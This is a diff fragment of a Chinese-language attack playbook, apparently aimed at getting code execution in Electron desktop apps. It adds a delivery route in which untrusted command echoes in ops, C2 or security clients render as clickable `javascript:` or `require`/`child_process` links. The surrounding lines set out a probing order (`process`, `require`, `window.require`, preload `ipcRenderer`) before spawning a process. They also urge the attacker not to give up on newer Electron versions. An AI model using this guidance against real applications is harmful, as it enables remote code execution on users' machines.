@@ -234,6 +234,8 @@ b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plu
 
 浏览器地址栏或任意 `href` 打开，系统会问「要打开该应用吗」——对方点一次就算合理交互，不需要中间人。
 
+投递 3（回显当协议，不必先有自定义 scheme）：运维/C2/安全客户端把**不可信命令回显**渲成可点击链。链里出现 `javascript:` 或能进 `require` / `child_process` 的 markup。假点：纯文本回显；渲染前剥协议；点了也不进 Node。算成同自定义协议。不要死抄某一家 markup。
+
 攻击页先探桥，再弹计算器。不要因为 Electron 18+ 或没有 `remote` 就停。顺序：`typeof process` → `typeof require`（`require.toString()` 含 `native` 才当真）→ `window.require` → 没有再看预加载桥 / `window.electron.ipcRenderer`。`require` 能直接 `child_process` 就用它；只有老窗口才走：
 
 ```
